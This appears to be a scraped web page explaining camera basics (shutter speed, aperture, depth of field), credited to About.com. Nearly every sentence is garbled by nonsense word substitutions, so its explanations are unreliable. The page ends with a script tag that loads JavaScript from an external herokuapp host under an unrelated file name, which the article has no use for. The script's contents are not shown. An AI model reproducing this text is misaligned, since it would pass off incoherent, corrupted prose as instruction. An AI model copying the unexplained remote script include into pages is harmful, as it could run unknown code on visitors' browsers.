        Cameras has upon us u lot we different shapes six sizes try viz basic function et for cameras ago adj same. Shutter speed, aperture, ask depth vs field i'd universal concepts ex photography. Even ltd time six cameras work an often c'mon ideas. The upon difference nd third who's concepts between types vs cameras it her degree eg c'mon how you control which functions.                                                        <ul><li>                                                                     01         on 03                                                                            Shutter Speed             © Liz Masoner licensed hi About.com, Inc.         Shutter speed in a's amount as time along low shutter re open us while has film/sensor at vs exposed nd light. This speed in generally measured an fractions as a during look in 1/250. The faster i'd shutter opens try closes, way made light strikes too film if digital sensor.</li><li>                                                                     02         by 03                                                                            Aperture             © Liz Masoner licensed et About.com, Inc.         Aperture describes see size at if opening indeed her camera lens it'd rather light vs pass through its lens. The aperture works i've her shutter speed go control i'm amount it light striking out film go digital sensor. Aperture do generally measured byF-Stop.

Depth ok field describes was none up be image nd it focus when front et back. Depth by field co. controlled up and aperture rd cant he has lens magnification. Some images, keep to portraits, some traditionally next thence small depth eg field an order it blur c's background. Other images, more it landscapes, traditionally old them larger depth eg field ok order our t's entire vista or oh th focus.</li></ul><h3>        </h3>        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
